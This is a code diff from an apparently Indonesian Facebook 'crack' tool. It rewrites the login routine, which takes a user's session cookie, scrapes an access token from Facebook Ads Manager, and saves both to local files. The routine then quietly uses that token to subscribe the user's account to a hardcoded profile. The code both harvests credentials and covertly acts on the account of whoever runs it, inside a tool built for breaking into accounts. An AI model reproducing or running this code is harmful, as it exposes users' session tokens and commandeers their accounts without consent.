@@ -180,45 +180,29 @@ def romz_xyz(cookie,venom={}):
 	return venom
 
 # MENU MASUK
-def Masuk():
-	logo()
-	print('')
-	print ('\n%s[%s01%s] %sLogin menggunakan cookies '%(O,P,O,P))
-	print ('%s[%s02%s] %sCara mendapatkan cookies '%(O,P,O,P))
-	print ('%s[%s03%s] %sLihat hasil crack '%(O,P,O,P))
-	print ('%s[%s00%s] %sKeluar '%(O,P,O,P))
-	rom = input ("\n%s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
-	if rom in['']:
-		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
-	elif rom in['1','01']:
-		kukis = input("\n%sMasukan cookie %s: %s"%(P,H,K))
-		with requests.Session() as ROMZ:
-			try:
-				get_tok = ROMZ.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-GB,en-US;q=0.9,en;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kukis})
-				token = re.search("(EAAG\w+)", get_tok.text).group(1)
-				open('data/cookie.txt','w').write(kukis)
-				open('data/token.txt','w').write(token)
-				requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
-				print ("\n%s √ login berhasil "%(H));jeda(2)
-				Menu()
-			except (KeyError):
-				exit ("\n%s× cookie kadaluwarsa "%(M));jeda(2)
-			except (IOError):
-				exit ("\n%s× login gagal, periksa cookies anda "%(M));jeda(2)
-			except (AttributeError):
-				exit ("\n%s× terjadi kesalahan "%(M));jeda(2)
-			except requests.exceptions.ConnectionError:
-				exit ("\n%s%s tidak ada koneksi "%(M,til));jeda(2)
-	elif rom in['2','02']:
-		os.system("xdg-open https://www.youtube.com/channel/UC-ZVCYSPdDiAKJ0a80GLHiw")
+def masuk():
+	try:
+		ses = requests.Session()
+		logo()
+		kukis = input(f'\n{P} Masukan cookie anda :{B} ')
+		url_tokB = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {"cookie":kukis})
+		ids_tokB = re.search("act=(.*?)&nav_source", url_tokB.text).group(1)
+		con_tokB = ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={ids_tokB}&nav_source=no_referrer', cookies = {"cookie":kukis})
+		tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
+		open('data/token.txt','w').write(tokenB)
+		open('data/cookie.txt','w').write(kukis)
+		print (f"\n{P} + token:{H} {tokenB}");jeda(2)
+		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
+		print (f"\n{H} √ login berhasil");jeda(2)
+		menu()
+	except Exception as e:
+		try:os.remove("data/cookie.txt")
+		except:pass
+		try:os.remove("data/token.txtt")
+		except:pass
+		print(e)
 		exit()
-	elif rom in['3','03']:
-		hasil_fb()
-	elif rom in['0','00']:
-		jalan ('\n%s%s Sampai jumpa tod...'%(M,til));jeda(2);exit()
-	else:
-		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
-		
+#  MENU		
 # MENU PILIHAN INI AJG
 hapus = ('rm -rf data/token.txt && rm -rf data/cookie.txt')
 def Menu():
